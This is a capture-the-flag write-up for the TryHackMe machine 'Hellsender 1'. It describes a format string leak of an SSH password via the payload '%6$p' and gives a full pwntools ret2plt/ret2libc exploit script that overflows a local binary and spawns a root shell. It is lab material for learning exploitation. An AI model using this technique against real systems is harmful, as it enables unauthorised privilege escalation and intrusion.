# Hellsender-1
Writeup for Hellsender 1 machine on THM.

Over port 9999 we have format string bug which leaks ssh password using payload `%6$p`.

For privilage escalation we have to exploit stack overflow on /home/joey/stack

There are a lot of ways to exploit the binary, i have done it with ret2plt + ret2libc method. 

Remember - ASLR is on.

```python
#!/usr/bin/python3

from pwn import *

exe = 'stack'
elf = context.binary = ELF(exe,checksec=False)
rop = ROP(elf)
context.log_level = 'info'
libc = elf.libc

def get_offset():
    io = process()
    io.sendline(cyclic(300))
    io.wait()
    core = Coredump('core')
    if context.arch == 'i386':
        sp = core.read(core.esp, 4)
    else:
        sp = core.read(core.rsp, 4)
    offset = cyclic_find(sp)
    success(f'Offset Found : {offset}')
    return offset

def get_ropchain():

    rop.puts(elf.got.puts)
    rop.vuln()

    return rop.chain()

offset = 168#get_offset()

rop_chain = get_ropchain()

payload = flat({offset:rop_chain}) 

write("payload",payload)
info ("Payload written to payload file")
info(f"ROP Chain - \n{rop.dump()}")

if args.REMOTE:
    io = remote('', )
else:
    io = process()

if args.GDB:
    gdb.attach(io,"""
    break main
    continue
    """)

io.clean()
io.sendline(payload)
leak = io.recv(6)
libc.address = unpack(leak,'all') - libc.sym.puts
info(hex(libc.address))
rop = ROP(libc)
rop.raw(rop.find_gadget(['ret']))
bin_sh = next(libc.search(b'/bin/sh\x00'))
rop.system(bin_sh)
info(rop.dump())
payload2 = flat({offset:rop.chain()})
io.sendline(payload2)
io.interactive()
```
